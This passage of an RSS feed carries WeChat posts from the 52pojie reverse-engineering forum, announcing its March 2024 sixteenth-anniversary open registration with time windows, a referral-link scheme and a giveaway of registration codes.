margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /><span></span></p><p><br /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1897975-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Mon, 11 Mar 2024 12:16:15 +0800</pubDate>
<pubDate>Mon, 11 Mar 2024 12:16:15 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册微信抽奖活动，提前再送40个账号注册码或300论坛币，下周二下午两点开奖，详见【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140204&amp;idx=1&amp;sn=7a3bb055249cc0f61a4f486a463cd61d&amp;chksm=bd50a0388a27292eba88011f5a15d764a81df5dc8506e2aa98c44462d89214e77e1c70a11e0f&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140204&amp;idx=1&amp;sn=7a3bb055249cc0f61a4f486a463cd61d&amp;chksm=bd50a0388a27292eba88011f5a15d764a81df5dc8506e2aa98c44462d89214e77e1c70a11e0f&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
<span></span> <span>2024-03-09 09:25</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a>
                      </div>
]]></content:encoded>
<pubDate>Fri, 08 Mar 2024 18:01:26 +0800</pubDate>
<pubDate>Fri, 08 Mar 2024 18:01:26 +0800</pubDate>
</item>
<item>
<title>【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140202&amp;idx=1&amp;sn=7dd95aeb1b06728ffabf80b96cb5b78c&amp;chksm=bd50a03e8a27292813723345291ff024137b34b76d5fcbcb17233cef50bc414346025e1ed639&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140202&amp;idx=1&amp;sn=7dd95aeb1b06728ffabf80b96cb5b78c&amp;chksm=bd50a03e8a27292813723345291ff024137b34b76d5fcbcb17233cef50bc414346025e1ed639&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
<span>吾爱pojie</span> <span>2024-03-08 16:23</span> <span style="display: inline-block;">北京</span>
</p>

<p>内有福利，再送40个账号注册码或300论坛币，吾爱破解论坛开放注册时间：2024年3月13日  12：00 -- 14：00 和  20：00 -- 22：00，赶紧上好闹钟顺便告诉小伙伴吧。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=4d4b4087&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKRP0qgyCAugN0VnYiblj3nJKlOLNIr2rdoJ8hH9icGltjmpicibCjJBfUJGwHvOmVh7InDutgLUxZKxQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">A</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">e</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">从</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">日</span></span><span style="display: inline-block; text-indent: initial;">建</span><span style="display: inline-block; text-indent: initial;">立</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">陪</span><span style="display: inline-block; text-indent: initial;">伴</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">了</span><strong><span style="color: rgb(0, 0, 255); background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">年</span></span></strong><span style="display: inline-block; text-indent: initial;">艰</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">辉</span><span style="display: inline-block; text-indent: initial;">煌</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">雨</span><span style="display: inline-block; text-indent: initial;">历</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">手</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span></span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">门</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">基</span><span style="display: inline-block; text-indent: initial;">础</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">汇</span><span style="display: inline-block; text-indent: initial;">集</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">批</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">此</span><span style="display: inline-block; text-indent: initial;">栖</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">今</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">依</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">忘</span><span style="display: inline-block; text-indent: initial;">初</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">起</span><span style="display: inline-block; text-indent: initial;">到</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">承</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">启</span><span style="display: inline-block; text-indent: initial;">下</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">圣</span><span style="display: inline-block; text-indent: initial;">殿</span><span style="display: inline-block; text-indent: initial;">。</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">博</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">朋</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">消</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">习</span><span style="display: inline-block; text-indent: initial;">交</span><span style="display: inline-block; text-indent: initial;">流</span></span><span><span style="display: inline-block; text-indent: initial;">逆</span><span style="display: inline-block; text-indent: initial;">向</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">析</span></span><span><span style="display: inline-block; text-indent: initial;">技</span><span style="display: inline-block; text-indent: initial;">术</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">生</span><span style="display: inline-block; text-indent: initial;">血</span><span style="display: inline-block; text-indent: initial;">液</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">商</span><span style="display: inline-block; text-indent: initial;">议</span><span style="display: inline-block; text-indent: initial;">决</span><span style="display: inline-block; text-indent: initial;">定</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span></span><span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span><span style="display: inline-block; text-indent: initial;">。</span></span></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">随</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">签</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">C</span><span style="display: inline-block; text-indent: initial;">B</span><span style="display: inline-block; text-indent: initial;">！</span></span></strong></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">避</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">由</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">负</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">影</span><span style="display: inline-block; text-indent: initial;">响</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">强</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">从</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">况</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">采</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">严</span><span style="display: inline-block; text-indent: initial;">格</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">措</span><span style="display: inline-block; text-indent: initial;">施</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">您</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">真</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">须</span><span style="display: inline-block; text-indent: initial;">知</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">及</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">适</span><span style="display: inline-block; text-indent: initial;">应</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">享</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">24</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">13</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span></span></strong><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span></span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">得</span><span style="display: inline-block; text-indent: initial;">贡</span><span style="display: inline-block; text-indent: initial;">献</span></h2><ul class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><span style="font-size: 14px;"><span style="font-size: 14px; font-weight: 700;">大家可以推荐自己的朋友注册</span>，从而增加自己的<span style="font-size: 14px; font-weight: 700;">贡献值</span>，只要通过你推荐的地址注册，你就会增加一个贡献值，注册完可以炫耀一下贡献值啦，你可以把我的账号改成你的账号就是你的推广地址啦，比如我的推广地址可以是以下链接：</span></p><blockquote style="margin-top: 0px; margin-bottom: 0px; color: rgb(106, 115, 125); padding-top: 0px; padding-right: 1em; padding-left: 1em; border-left-width: 0.25em; border-left-color: rgb(223, 226, 229);"><p style="margin-bottom: 15px;"><span style="font-size: 14px;">https://www.52pojie.cn/?fromuser=LCG</span><span style="font-size: 14px;"> 【把LCG换成自己的账号即可】</span></p><p><span style="font-size: 14px;">https://www.52pojie.cn/?fromuid=14</span><span style="font-size: 14px;"> 【把14换成自己的UID即可，UID查看：</span><span style="font-size: 14px;">https://www.52pojie.cn/home.php?mod=space&amp;do=profile</span><span style="font-size: 14px;"> 】</span></p></blockquote></li></ul><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">要</span><span style="display: inline-block; text-indent: initial;">准</span><span style="display: inline-block; text-indent: initial;">备</span><span style="display: inline-block; text-indent: initial;">什</span><span style="display: inline-block; text-indent: initial;">么</span><span style="display: inline-block; text-indent: initial;">？</span></span></h2><ol class="list-paddingleft-1" style="padding-left: 0px; color: rgb(53, 53, 53);"><li><p style="line-height: 1.6;"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">★</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">优</span><span style="display: inline-block; text-indent: initial;">先</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;"> </span><strong style="line-height: 1.6;"><span style="color: rgb(255, 0, 0); line-height: 1.6;"><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">码</span><span style="display: inline-block; text-indent: initial;">异</span><span style="display: inline-block; text-indent: initial;">常</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">待</span><span style="display: inline-block; text-indent: initial;">验</span><span style="display: inline-block; text-indent: initial;">证</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">员</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span><span style="display: inline-block; text-indent: initial;">、</span><span style="display: inline-block; text-indent: initial;">邮</span><span style="display: inline-block; text-indent: initial;">件</span><span style="display: inline-block; text-indent: initial;">激</span><span style="display: inline-block; text-indent: initial;">活</span><span style="display: inline-block; text-indent: initial;">问</span><span style="display: inline-block; text-indent: initial;">题</span></span></strong><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">帮</span><span style="display: inline-block; text-indent: initial;">助</span><span 